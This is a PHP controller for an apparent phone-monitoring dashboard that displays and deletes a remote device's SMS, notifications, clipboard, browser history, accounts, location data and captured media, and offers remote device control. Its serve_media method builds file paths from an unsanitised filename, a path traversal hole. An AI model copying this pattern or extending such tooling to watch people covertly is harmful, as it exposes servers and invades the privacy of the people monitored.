<?php

namespace App\Controllers\clients;

use App\Models\Mod_Crypt;
use CodeIgniter\API\ResponseTrait;

class Advanced extends BaseClientController
{
    use ResponseTrait;

    private const DETAIL_PER_PAGE = 50;

    private function commonData(string $active, string $title): array
    {
        $counts = $this->getUserDataCounts();
        return array_merge($counts, [
            'pag' => 'advanced',
            'title' => $title,
            'nav_urls' => $this->getAdvancedNavUrls($active, $counts),
            'active_tab' => $active,
        ]);
    }

    /**
     * Navigation tabs shared across all advanced pages.
     */
    private function getAdvancedNavUrls(string $activeView, array $counts = []): string
    {
        $hardware_tabs = [
            // Individual hardware pages
            'device_context', 'network_info', 'bluetooth', 'sensors', 'camera_info',
            'battery_stats', 'processes', 'proc_info', 'cell_towers', 'display_info',
            'storage', 'thermal', 'nfc', 'hardware_graphics', 'hardware_network',
            'audio_devices', 'biometric', 'gnss_hardware', 'power_rails', 'usb_devices',
            'vibration', 'sim_configs',
            // Merged hardware pages
            'hardware_dashboard', 'battery_power', 'system_performance', 'network_connectivity',
            'display_graphics', 'sensors_location', 'media_hardware', 'storage_peripherals',
            'shortrange_auth', 'device_fingerprint', 'hardware_landing'
        ];
        $software_tabs = [
            'accounts', 'calendar', 'app_usage', 'notifications', 'security_audit',
            'accessibility', 'input_methods', 'remote_media', 'data_usage', 'saved_wifi',
            'default_apps', 'alarms', 'app_security', 'network_security', 'telephony_network',
            'system_locale', 'app_permissions', 'browser_history', 'clipboard',
            'content_providers', 'crash_logs', 'digital_wellbeing', 'doze_standby',
            'email', 'health_data', 'keyboard_input', 'keyguard', 'screenshots',
            'screen_state', 'vpn_config', 'running_processes', 'software_landing'
        ];

        $is_hardware = in_array($activeView, $hardware_tabs);
        $is_software = in_array($activeView, $software_tabs);

        $html = '<div class="d-flex justify-content-end flex-wrap mb-3" style="gap: 8px;">';
        $html .= sprintf(
            '<a class="btn btn-sm %s" href="%s"><i class="fas fa-microchip mr-1"></i> Hardware</a>',
            $is_hardware ? 'btn-primary' : 'btn-outline-secondary',
            base_url('advanced/hardware')
        );
        $html .= sprintf(
            '<a class="btn btn-sm %s" href="%s"><i class="fas fa-laptop-code mr-1"></i> Software</a>',
            $is_software ? 'btn-primary' : 'btn-outline-secondary',
            base_url('advanced/software')
        );
        $html .= '</div>';
        return $html;
    }

    /** GET /advanced/device */

    public function device_context()
    {
        $data = array_merge($this->commonData('device_context', 'Device Context'), [
            'rows' => $this->finderModel->get_device_context($this->userId),
            'total' => $this->finderModel->get_count_DeviceContext($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/device_context', $data);
    }

    /** GET /advanced/network */
    public function network_info()
    {
        $rows = $this->finderModel->get_network_info($this->userId);
        // Attach nearby wifi to each row
        foreach ($rows as &$row) {
            $row['nearby_wifi'] = $this->finderModel->get_nearby_wifi($row['id']);
        }
        $data = array_merge($this->commonData('network_info', 'Network Info'), [
            'rows' => $rows,
            'total' => $this->finderModel->get_count_NetworkInfo($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/network_info', $data);
    }

    /** GET /advanced/accounts */
    public function accounts()
    {
        $builder = $this->finderModel->getAccountsQuery($this->userId);
        [$rows, $pager, $total] = $this->paginate($builder, 25);

        $data = array_merge($this->commonData('accounts', 'Accounts'), [
            'rows'     => $rows,
            'total'    => $total,
            'pager'    => $pager,
        ]);

        return $this->renderAppView('users/advanced/accounts', $data);
    }

    /** GET /analysis/advanced_timeline */
    public function timeline()
    {
        $events = $this->finderModel->get_timeline_events($this->userId, 50);

        // Enrich events (e.g. decode SMS)
        foreach ($events as &$ev) {
            if ($ev['event_type'] === 'sms' && !empty($ev['meta2'])) {
                $ev['meta2'] = base64_decode($ev['meta2']);
            }
        }

        $total = $this->finderModel->get_count_timeline_events($this->userId);

        $data = array_merge($this->commonData('timeline', 'Device Timeline'), [
            'events' => $events,
            'total' => $total,
            'pager' => $this->finderModel->getPager(),
            'pag' => 'timeline', // Ensure sidebar makes Timeline active!
        ]);

        return $this->renderAppView('users/advanced/timeline', $data);
    }

    /** GET /advanced/calendar */
    public function calendar()
    {
        $data = array_merge($this->commonData('calendar', 'Calendar Events'), [
            'rows' => $this->finderModel->get_calendar_events($this->userId),
            'total' => $this->finderModel->get_count_Calendar($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/calendar', $data);
    }

    /** GET /advanced/app-usage */
    public function app_usage()
    {
        $rows = $this->enrichAppUsageGroupedRows(
            $this->finderModel->get_app_usage_grouped($this->userId, self::DETAIL_PER_PAGE)
        );

        $data = array_merge($this->commonData('app_usage', 'App Usage'), [
            'rows' => $rows,
            'total' => $this->finderModel->get_count_app_usage_packages($this->userId),
            'total_snapshots' => $this->finderModel->get_count_AppUsage($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);

        return $this->renderAppView('users/advanced/app_usage', $data);
    }

    /** GET /advanced/app-usage/{package} */
    public function app_usage_detail(string $encodedPkg)
    {
        $packageName = $this->decodePackageSegment($encodedPkg);
        if ($packageName === null) {
            throw \CodeIgniter\Exceptions\PageNotFoundException::forPageNotFound();
        }

        $summary = $this->finderModel->get_app_usage_package_summary($this->userId, $packageName);
        if (empty($summary)) {
            throw \CodeIgniter\Exceptions\PageNotFoundException::forPageNotFound();
        }

        $sessions = $this->enrichAppUsageSessions(
            $this->finderModel->get_app_usage_sessions_for_package(
                $this->userId,
                $packageName,
                self::DETAIL_PER_PAGE
            )
        );

        // Build background_time map from session events per app_usage_id
        $bgTimeMap = $this->computeBackgroundTimeFromSessions($sessions);

        $summary['last_used_display'] = $this->formatMsDatetime($summary['last_time_used'] ?? null, 'M d, Y, l H:i');

        $appDetail = $this->finderModel->get_app_detail_by_package($this->userId, $packageName);

        $data = array_merge($this->commonData('app_usage', 'App Usage — ' . ($summary['app_name'] ?? $packageName)), [
            'rows' => $this->enrichAppUsageDetailRows(
                $this->finderModel->get_app_usage_for_package($this->userId, $packageName, self::DETAIL_PER_PAGE),
                $bgTimeMap
            ),
            'total' => $this->finderModel->get_count_app_usage_for_package($this->userId, $packageName),
            'pager' => $this->finderModel->getPager(),
            'package_name' => $packageName,
            'summary' => $summary,
            'app_detail' => $appDetail,
            'sessions' => $sessions,
            'back_url' => base_url('advanced/software/app-usage'),
            'encoded_pkg' => $encodedPkg,
            'nav_urls' => '',
        ]);

        $data['detail_mode'] = true;

        return $this->renderAppView('users/advanced/app_usage_detail', $data);
    }

    /** GET /advanced/notifications */
    public function notifications()
    {
        $rows = $this->enrichNotificationGroupedRows(
            $this->finderModel->get_notifications_grouped($this->userId, self::DETAIL_PER_PAGE)
        );

        $data = array_merge($this->commonData('notifications', 'Notifications'), [
            'rows' => $rows,
            'total' => $this->finderModel->get_count_notification_groups($this->userId),
            'total_notifications' => $this->finderModel->get_count_Notifications($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);

        return $this->renderAppView('users/advanced/notifications', $data);
    }

    /** GET /advanced/notifications/{group} */
    public function notification_detail(string $encodedPkg)
    {
        $groupKey = $this->decodePackageSegment($encodedPkg);
        if ($groupKey === null) {
            throw \CodeIgniter\Exceptions\PageNotFoundException::forPageNotFound();
        }

        $summary = $this->finderModel->get_notifications_group_summary($this->userId, $groupKey);
        if (empty($summary)) {
            throw \CodeIgniter\Exceptions\PageNotFoundException::forPageNotFound();
        }

        $summary['latest_ts_abs'] = $this->formatMsDatetime($summary['latest_timestamp'] ?? null, 'M d, Y, l H:i');
        $summary['latest_ts_rel'] = $this->formatRelativeTime($summary['latest_timestamp'] ?? null);

        $appDetail = $this->finderModel->get_app_detail_by_package($this->userId, $groupKey);

        $data = array_merge($this->commonData('notifications', 'Notifications — ' . ($summary['display_name'] ?? $groupKey)), [
            'rows' => $this->enrichNotificationDetailRows(
                $this->finderModel->get_notifications_for_group($this->userId, $groupKey, self::DETAIL_PER_PAGE)
            ),
            'total' => $this->finderModel->get_count_notifications_for_group($this->userId, $groupKey),
            'pager' => $this->finderModel->getPager(),
            'group_key' => $groupKey,
            'summary' => $summary,
            'app_detail' => $appDetail,
            'back_url' => base_url('advanced/software/notifications'),
            'encoded_pkg' => $encodedPkg,
            'nav_urls' => '',
        ]);

        $data['detail_mode'] = true;

        return $this->renderAppView('users/advanced/notification_detail', $data);
    }

    /**
     * Decode a URL segment back to a plain package/group name.
     * Segment is simply urlencode()'d — e.g. com.twitter.android stays as-is.
     */
    private function decodePackageSegment(string $segment): ?string
    {
        if ($segment === '') {
            return null;
        }

        $decoded = urldecode($segment);

        return ($decoded !== '') ? $decoded : null;
    }

    /**
     * Encode a package/group name for safe use in a URL segment.
     * urlencode() percent-encodes special chars; dots and letters pass through unchanged.
     */
    private function encodePackageSegment(string $value): string
    {
        return urlencode($value);
    }

    private function formatMsDatetime($msTimestamp, string $format = 'Y-m-d H:i:s'): string
    {
        if ($msTimestamp === null || $msTimestamp === '' || (int) $msTimestamp === 0) {
            return '—';
        }

        return date($format, (int) floor((int) $msTimestamp / 1000));
    }

    private function formatRelativeTime($msTimestamp): string
    {
        if ($msTimestamp === null || $msTimestamp === '' || (int) $msTimestamp === 0) {
            return '—';
        }

        $seconds = (int) floor((int) $msTimestamp / 1000);
        $diff = time() - $seconds;

        if ($diff < 60) {
            return 'just now';
        }
        if ($diff < 3600) {
            return (int) floor($diff / 60) . ' min ago';
        }
        if ($diff < 86400) {
            return (int) floor($diff / 3600) . ' h ago';
        }
        if ($diff < 604800) {
            return (int) floor($diff / 86400) . ' d ago';
        }

        return date('Y-m-d H:i', $seconds);
    }

    private function enrichAppUsageGroupedRows(array $rows): array
    {
        foreach ($rows as &$row) {
            $row['last_used_display'] = $this->formatMsDatetime($row['last_time_used'] ?? null, 'M d, Y, l H:i');
            // urlencode: com.twitter.android → com.twitter.android (dots are safe, no change)
            $row['package_url_enc'] = urlencode((string) ($row['package_name'] ?? ''));
        }

        return $rows;
    }

    private function enrichNotificationGroupedRows(array $rows): array
    {
        foreach ($rows as &$row) {
            $ts = $row['latest_timestamp'] ?? null;
            $row['latest_ts_abs'] = $this->formatMsDatetime($ts, 'M d, Y, l H:i');
            $row['latest_ts_rel'] = $this->formatRelativeTime($ts);
            // urlencode: com.twitter.android → com.twitter.android (dots are safe, no change)
            $row['group_url_enc'] = urlencode((string) ($row['group_key'] ?? ''));
            $row['latest_title_short'] = mb_strimwidth($row['latest_title'] ?? '—', 0, 60, '…');
        }

        return $rows;
    }

    /**
     * Compute total background time per app_usage_id from session events.
     *
     * Pairs consecutive session events: background time is accumulated
     * between a 'paused'/'closed' event and the next 'opened' event.
     *
     * @param array $sessions Enriched session rows (must contain app_usage_id, event_type, timestamp)
     * @return array<int, int> Map of app_usage_id → total background time in ms
     */
    private function computeBackgroundTimeFromSessions(array $sessions): array
    {
        // Group sessions by app_usage_id
        $grouped = [];
        foreach ($sessions as $s) {
            $id = (int) ($s['app_usage_id'] ?? 0);
            if ($id <= 0) continue;
            $grouped[$id][] = $s;
        }

        $bgMap = [];
        foreach ($grouped as $id => $events) {
            // Sort by timestamp ascending
            usort($events, fn($a, $b) => ((int)($a['timestamp'] ?? 0)) <=> ((int)($b['timestamp'] ?? 0)));

            $bgMs = 0;
            $lastBgEventTs = null; // Timestamp of last 'paused' or 'closed'
            foreach ($events as $ev) {
                $type = strtolower($ev['event_type'] ?? '');
                $ts   = (int) ($ev['timestamp'] ?? 0);
                if ($ts <= 0) continue;

                if (in_array($type, ['paused', 'closed'])) {
                    $lastBgEventTs = $ts;
                } elseif ($type === 'opened' && $lastBgEventTs !== null) {
                    $bgMs += ($ts - $lastBgEventTs);
                    $lastBgEventTs = null;
                }
            }
            if ($bgMs > 0) {
                $bgMap[$id] = $bgMs;
            }
        }

        return $bgMap;
    }

    private function enrichAppUsageDetailRows(array $rows, array $bgTimeMap = []): array
    {
        $count = count($rows);
        for ($i = 0; $i < $count; $i++) {
            $rows[$i]['last_used_display'] = $this->formatMsDatetime($rows[$i]['last_time_used'] ?? null, 'M d, Y, l H:i');
            $rows[$i]['extracted_display'] = $this->formatMsDatetime($rows[$i]['extracted_at'] ?? null, 'M d, Y, l H:i');

            $bgFromSessions = $bgTimeMap[(int)($rows[$i]['id'] ?? 0)] ?? 0;

            if ($i < $count - 1) {
                $currentFg = (int) ($rows[$i]['foreground_time_ms'] ?? 0);
                $prevFg    = (int) ($rows[$i + 1]['foreground_time_ms'] ?? 0);
                $fgDelta   = $currentFg - $prevFg;
                if ($fgDelta < 0) $fgDelta = $currentFg;

                $rows[$i]['time_taken_ms'] = $fgDelta;

                $currentExt = (int) ($rows[$i]['extracted_at'] ?? 0);
                $prevExt    = (int) ($rows[$i + 1]['extracted_at'] ?? 0);

                // Use absolute wall-clock delta regardless of row order
                if ($currentExt > 0 && $prevExt > 0) {
                    $wallDelta = abs($currentExt - $prevExt);
                    $rows[$i]['background_time_ms'] = max(0, $wallDelta - $fgDelta);
                } else {
                    $rows[$i]['background_time_ms'] = $bgFromSessions;
                }
            } else {
                $rows[$i]['time_taken_ms'] = null;
                $rows[$i]['background_time_ms'] = $bgFromSessions;
            }
        }

        return $rows;
    }

    private function enrichAppUsageSessions(array $sessions): array
    {
        foreach ($sessions as &$row) {
            $row['timestamp_display'] = $this->formatMsDatetime($row['timestamp'] ?? null, 'M d, Y, l H:i');
        }

        return $sessions;
    }

    private function enrichNotificationDetailRows(array $rows): array
    {
        foreach ($rows as &$row) {
            $ts = $row['notification_timestamp'] ?? null;
            $row['ts_abs'] = $this->formatMsDatetime($ts, 'M d, Y, l H:i');
            $row['ts_rel'] = $this->formatRelativeTime($ts);
        }

        return $rows;
    }

    /** GET /advanced/bluetooth */
    public function bluetooth()
    {
        $rows = $this->finderModel->get_bluetooth($this->userId);
        $data = array_merge($this->commonData('bluetooth', 'Bluetooth'), [
            'rows' => $rows,
            'total' => $this->finderModel->get_count_Bluetooth($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/bluetooth', $data);
    }

    /** GET /advanced/sensors */
    public function sensors()
    {
        $data = array_merge($this->commonData('sensors', 'Sensor Profile'), [
            'rows' => $this->finderModel->get_sensor_profile($this->userId),
            'total' => $this->finderModel->get_count_Sensors($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/sensors', $data);
    }

    /** GET /advanced/security_audit */
    public function security_audit()
    {
        $rows = $this->finderModel->get_security_audit($this->userId);
        foreach ($rows as &$r) {
            $r['ts_display'] = !empty($r['extracted_at']) ? format_timestamp_display((int)$r['extracted_at']) : '—';
        }
        unset($r);
        $data = array_merge($this->commonData('security_audit', 'Security Audit'), [
            'rows' => $rows,
            'total' => $this->finderModel->get_count_SecurityAudit($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/security_audit', $data);
    }

    /** GET /remote-device */
    public function remote_device()
    {
        $userModel = new \App\Models\Mod_User();
        $devices = $userModel->get_user_devices_from_profile($this->userId);

        $targetDevice = null;
        $deviceIds = array_column($devices, 'device_id');

        if (!empty($deviceIds)) {
            $db = \Config\Database::connect();
            $targetDevice = $db->table('tbl_device_profiles')
                ->whereIn('device_id', $deviceIds)
                ->where('fcm_token !=', '')
                ->where('fcm_token IS NOT NULL')
                ->orderBy('counter', 'DESC') // Bottom-most record in the table
                ->get()
                ->getRowArray();
        }

        $recentUploadSources = [];
        if ($targetDevice) {
            $db = \Config\Database::connect();
            $recentUploadSources = $db->table('tbl_uploaded_files')
                ->select('upload_source, COUNT(*) as count')
                ->where('token_owner_id', $this->userId)
                ->where('uploaded_at >= DATE_SUB(NOW(), INTERVAL 7 DAY)')
                ->groupBy('upload_source')
                ->get()
                ->getResultArray();
        }

        $counts = $this->getUserDataCounts();
        $data = array_merge($counts, [
            'pag' => 'remote_device',
            'title' => 'Remote Device Control',
            'targetDevice' => $targetDevice,
            'recentUploadSources' => $recentUploadSources,
        ]);

        return $this->renderAppView('users/advanced/remote_device', $data);
    }

    /** GET /advanced/media */
    public function remote_media()
    {
        [$rows, $pager, $total] = $this->paginate(
            $this->finderModel->tableQuery('tbl_extracted_media_files', $this->userId, 'created_at', 'DESC')
        );

        foreach ($rows as &$r) {
            $r['created_at_display'] = isset($r['created_at'])
                ? date('M d, Y, H:i (l)', strtotime($r['created_at']))
                : '—';
        }
        unset($r);

        $data = array_merge($this->commonData('remote_media', 'Remote Media Forensic'), [
            'rows' => $rows,
            'total' => $total,
            'pager' => $pager,
        ]);
        return $this->renderAppView('users/advanced/remote_media', $data);
    }

    /** GET /advanced/media/serve/(:any) */
    public function serve_media($filename)
    {
        $path = WRITEPATH . 'uploads/captured/' . $filename;
        if (!file_exists($path)) {
            $path = WRITEPATH . 'uploads/audio/' . $filename;
        }

        if (!file_exists($path)) {
            throw \CodeIgniter\Exceptions\PageNotFoundException::forPageNotFound();
        }

        $mimeType = mime_content_type($path);
        return $this->response
            ->setHeader('Content-Type', $mimeType)
            ->setBody(file_get_contents($path));
    }

    /** POST /advanced/media/delete/(:num) */
    public function delete_media($id)
    {
        $media = $this->finderModel->get_captured_media_by_id($id, $this->userId);
        if (!$media) {
            return $this->failNotFound('Media record not found');
        }

        // Delete physical file
        $path = WRITEPATH . 'uploads/captured/' . $media['stored_filename'];
        if (!file_exists($path)) {
            $path = WRITEPATH . 'uploads/audio/' . $media['stored_filename'];
        }

        if (file_exists($path)) {
            @unlink($path);
        }

        // Delete database record
        if ($this->finderModel->delete_captured_media($id, $this->userId)) {
            return $this->respondDeleted(['success' => true, 'message' => 'Media deleted successfully']);
        }

        return $this->fail('Failed to delete media record');
    }

    /** POST /advanced/app-usage/delete/(:num) */
    public function delete_app_usage($id)
    {
        if ($this->finderModel->delete_app_usage((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'App usage snapshot deleted.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete snapshot.']);
    }

    /** POST /advanced/notifications/delete-row/(:num) */
    public function delete_notification_row($id)
    {
        if ($this->finderModel->delete_notification((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Notification deleted.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete notification.']);
    }

    /** POST /advanced/notifications/delete/(:any) */
    public function delete_notifications_by_app($pkgEnc = null)
    {
        // Support both route segment and POST data
        if ($pkgEnc === null) {
            $pkgEnc = $this->request->getPost('pkg') ?? $this->request->uri->getSegment(5);
        }
        $packageName = $this->decodePackageSegment($pkgEnc);
        if (!$packageName) {
            if ($this->request->isAJAX()) {
                return $this->response->setJSON(['success' => false, 'message' => 'Invalid package name']);
            }
            $this->session->setFlashdata('error', 'Invalid package name');
            return redirect()->to(base_url('advanced/software/notifications'));
        }
        if ($this->finderModel->delete_notifications_by_app($this->userId, $packageName)) {
            if ($this->request->isAJAX()) {
                return $this->response->setJSON(['success' => true, 'message' => 'All notifications for the app have been deleted']);
            }
            $this->session->setFlashdata('success', 'All notifications for the app have been deleted');
            return redirect()->to(base_url('advanced/software/notifications'));
        }
        if ($this->request->isAJAX()) {
            return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete notifications for the app']);
        }
        $this->session->setFlashdata('error', 'Failed to delete notifications for the app');
        return redirect()->to(base_url('advanced/software/notifications'));
    }

    /** POST /advanced/device/delete/(:num) */
    public function delete_device_context($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_device_context_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** POST /advanced/network/delete/(:num) */
    public function delete_network_info($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_network_info_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** POST /advanced/accounts/delete/(:num) */
    public function delete_accounts_row($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_accounts_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** POST /advanced/calendar/delete/(:num) */
    public function delete_calendar_event($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_calendar_event((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Event deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete event.']);
    }

    /** POST /advanced/bluetooth/delete/(:num) */
    public function delete_bluetooth_row($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_bluetooth_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** POST /advanced/sensors/delete/(:num) */
    public function delete_sensor_profile($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_sensor_profile((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Sensor deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete sensor.']);
    }

    /** POST /advanced/security_audit/delete/(:num) */
    public function delete_security_audit_row($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_security_audit_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** POST /advanced/app-usage/delete-package/(:any) */
    public function delete_app_usage_by_package($encodedPkg)
    {
        $packageName = $this->decodePackageSegment($encodedPkg);
        if ($packageName === null) {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid package name.']);
        }
        if ($this->finderModel->delete_app_usage_by_package($this->userId, $packageName)) {
            return $this->response->setJSON(['success' => true, 'message' => 'All usage data for this app has been deleted.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete usage data.']);
    }

    /** GET /advanced/camera_info */
    public function camera_info()
    {
        $data = array_merge($this->commonData('camera_info', 'Camera Info'), [
            'rows' => $this->finderModel->get_camera_info($this->userId),
            'total' => $this->finderModel->get_count_CameraInfo($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/camera_info', $data);
    }

    /** GET /advanced/battery_stats */
    public function battery_stats()
    {
        $data = array_merge($this->commonData('battery_stats', 'Battery Stats'), [
            'rows' => $this->finderModel->get_battery_stats($this->userId),
            'total' => $this->finderModel->get_count_BatteryStats($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/battery_stats', $data);
    }

    /** GET /advanced/accessibility */
    public function accessibility()
    {
        $data = array_merge($this->commonData('accessibility', 'Accessibility Services'), [
            'rows' => $this->finderModel->get_accessibility($this->userId),
            'total' => $this->finderModel->get_count_Accessibility($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/accessibility', $data);
    }

    /** GET /advanced/input_methods */
    public function input_methods()
    {
        $data = array_merge($this->commonData('input_methods', 'Input Methods (IMEs)'), [
            'rows' => $this->finderModel->get_input_methods($this->userId),
            'total' => $this->finderModel->get_count_InputMethods($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/input_methods', $data);
    }

    /** GET /advanced/processes */
    public function processes()
    {
        $data = array_merge($this->commonData('processes', 'Running Processes'), [
            'rows' => $this->finderModel->get_processes($this->userId),
            'total' => $this->finderModel->get_count_Processes($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/processes', $data);
    }

    /** POST /advanced/camera_info/delete/(:num) */
    public function delete_camera_info($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_camera_info_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** POST /advanced/battery_stats/delete/(:num) */
    public function delete_battery_stats($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_battery_stats_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** POST /advanced/accessibility/delete/(:num) */
    public function delete_accessibility($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_accessibility_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** POST /advanced/input_methods/delete/(:num) */
    public function delete_input_methods($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_input_methods_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** GET /advanced/proc_info */
    public function proc_info()
    {
        $rows = $this->finderModel->get_proc_info($this->userId);

        $data = array_merge($this->commonData('proc_info', 'Proc Info'), [
            'rows' => $rows,
            'total' => $this->finderModel->get_count_ProcInfo($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/proc_info', $data);
    }

    /** POST /advanced/proc_info/delete/(:num) */
    public function delete_proc_info($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_proc_info_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** POST /advanced/processes/delete/(:num) */
    public function delete_processes($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_processes_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** GET /advanced/hardware */
    public function hardware()
    {
        $subModel = new \App\Models\SubscriptionModel();
        $userTier = $subModel->getPlanTier($this->userId);
        $counts = $this->getUserDataCounts();
        
        $db = \Config\Database::connect();
        $features = $db->table('tbl_feature_tiers')
                       ->where('category_type', 'hardware')
                       ->get()
                       ->getResultArray();

        return $this->renderAppView('users/advanced/hardware', [
            'pag' => 'advanced',
            'active_tab' => 'hardware_landing',
            'title' => 'Hardware',
            'counts' => $counts,
            'userTier' => $userTier,
            'features' => $features,
        ]);
    }

    /** GET /advanced/software */
    public function software()
    {
        $subModel = new \App\Models\SubscriptionModel();
        $userTier = $subModel->getPlanTier($this->userId);
        $counts = $this->getUserDataCounts();

        $db = \Config\Database::connect();
        $features = $db->table('tbl_feature_tiers')
                       ->where('category_type', 'software')
                       ->get()
                       ->getResultArray();

        return $this->renderAppView('users/advanced/software', [
            'pag' => 'advanced',
            'active_tab' => 'software_landing',
            'title' => 'Software',
            'counts' => $counts,
            'userTier' => $userTier,
            'features' => $features,
        ]);
    }

    // ── NEW EXTRACTORS: Hardware ──

    /** GET /advanced/hardware/cell_towers */
    public function cell_towers()
    {
        $data = array_merge($this->commonData('cell_towers', 'Cell Towers'), [
            'rows' => $this->finderModel->get_cell_towers($this->userId),
            'total' => $this->finderModel->get_count_CellTowers($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/cell_towers', $data);
    }

    /** POST /advanced/hardware/cell_towers/delete/(:num) */
    public function delete_cell_towers($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_cell_towers_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** GET /advanced/hardware/display_info */
    public function display_info()
    {
        $data = array_merge($this->commonData('display_info', 'Display Info'), [
